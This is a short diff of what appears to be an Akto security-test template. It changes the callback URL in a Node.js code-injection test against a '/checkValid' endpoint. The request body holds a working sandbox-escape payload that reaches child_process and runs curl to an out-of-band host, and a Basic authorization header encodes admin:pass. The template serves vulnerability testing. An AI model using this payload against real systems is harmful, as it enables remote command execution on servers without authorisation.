@@ -34,7 +34,7 @@ execute:
         - send_ssrf_req:
             url: "https://test-services.akto.io/store_uuid/${random_uuid}"
         - modify_method: POST
-        - replace_body: 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("curl https://test-services.akto.io/store_uuid/${random_uuid}")'
+        - replace_body: 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("curl https://test-services.akto.io/${random_uuid}")'
         - modify_url: "/checkValid"
         - modify_header:
             authorization: "Basic YWRtaW46cGFzcw=="
